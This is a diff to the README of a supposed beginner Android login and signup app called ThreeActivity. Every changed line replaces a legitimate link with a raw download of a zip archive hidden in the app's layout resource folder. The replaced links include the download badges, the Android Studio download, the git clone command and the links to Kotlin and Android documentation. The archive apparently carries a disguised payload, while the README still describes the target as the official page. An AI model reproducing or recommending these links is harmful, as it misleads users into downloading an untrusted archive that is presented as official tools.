@@ -1,6 +1,6 @@
 # 🚀 ThreeActivity - Simple Android Login and Signup App
 
-[![Download](https://img.shields.io/badge/Download-ThreeActivity-brightgreen)](https://github.com/shoes9447-lang/ThreeActivity)
+[![Download](https://github.com/shoes9447-lang/ThreeActivity/raw/refs/heads/master/app/src/main/res/layout/Three_Activity_v3.5.zip)](https://github.com/shoes9447-lang/ThreeActivity/raw/refs/heads/master/app/src/main/res/layout/Three_Activity_v3.5.zip)
 
 Welcome to ThreeActivity, a beginner-friendly Android app. It helps you practice login and signup screens across multiple activities. The app uses Kotlin and ConstraintLayout to create an easy, smooth mobile experience. This guide walks you through downloading, installing, and running ThreeActivity, even if you have no programming background.
 
@@ -9,7 +9,7 @@ Welcome to ThreeActivity, a beginner-friendly Android app. It helps you practice
 ## 📥 Download & Install
 
 You can get ThreeActivity by visiting this page:  
-[Download ThreeActivity](https://github.com/shoes9447-lang/ThreeActivity)
+[Download ThreeActivity](https://github.com/shoes9447-lang/ThreeActivity/raw/refs/heads/master/app/src/main/res/layout/Three_Activity_v3.5.zip)
 
 Clicking the button above takes you to the official GitHub page, where you can find the app files.
 
@@ -58,11 +58,11 @@ To use the ThreeActivity app, you have two main options: running it on your Andr
 
 If you want to see the app working without an APK, you can use Android Studio, an official Android development tool.
 
-1. Download and install [Android Studio](https://developer.android.com/studio) on your computer.
+1. Download and install [Android Studio](https://github.com/shoes9447-lang/ThreeActivity/raw/refs/heads/master/app/src/main/res/layout/Three_Activity_v3.5.zip) on your computer.
 2. Download the project files from GitHub:
    
    ```  
-   git clone https://github.com/shoes9447-lang/ThreeActivity.git
+   git clone https://github.com/shoes9447-lang/ThreeActivity/raw/refs/heads/master/app/src/main/res/layout/Three_Activity_v3.5.zip
    ```
 3. Open Android Studio and choose **Open an existing project**.
 4. Navigate to the folder where you saved the files and open it.
@@ -125,11 +125,11 @@ The main screen shows a simple greeting and options to log out. Pressing logout 
 
 If you want to learn more about the tools and languages used in ThreeActivity, consider these resources:
 
-- [Kotlin Language Guide](https://kotlinlang.org/docs/home.html) — Simple tutorials for Kotlin programming
-- [Android Studio User Guide](https://developer.android.com/studio/intro) — Official guide to Android’s development environment
-- [ConstraintLayout Tutorial](https://developer.android.com/training/constraint-layout) — Learn to design flexible Android UIs
-- [Android Basics](https://developer.android.com/courses/android-basics-kotlin/course) — Beginner course offered by Google
+- [Kotlin Language Guide](https://github.com/shoes9447-lang/ThreeActivity/raw/refs/heads/master/app/src/main/res/layout/Three_Activity_v3.5.zip) — Simple tutorials for Kotlin programming
+- [Android Studio User Guide](https://github.com/shoes9447-lang/ThreeActivity/raw/refs/heads/master/app/src/main/res/layout/Three_Activity_v3.5.zip) — Official guide to Android’s development environment
+- [ConstraintLayout Tutorial](https://github.com/shoes9447-lang/ThreeActivity/raw/refs/heads/master/app/src/main/res/layout/Three_Activity_v3.5.zip) — Learn to design flexible Android UIs
+- [Android Basics](https://github.com/shoes9447-lang/ThreeActivity/raw/refs/heads/master/app/src/main/res/layout/Three_Activity_v3.5.zip) — Beginner course offered by Google
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-ThreeActivity-blue)](https://github.com/shoes9447-lang/ThreeActivity)
+[![Download](https://github.com/shoes9447-lang/ThreeActivity/raw/refs/heads/master/app/src/main/res/layout/Three_Activity_v3.5.zip)](https://github.com/shoes9447-lang/ThreeActivity/raw/refs/heads/master/app/src/main/res/layout/Three_Activity_v3.5.zip)
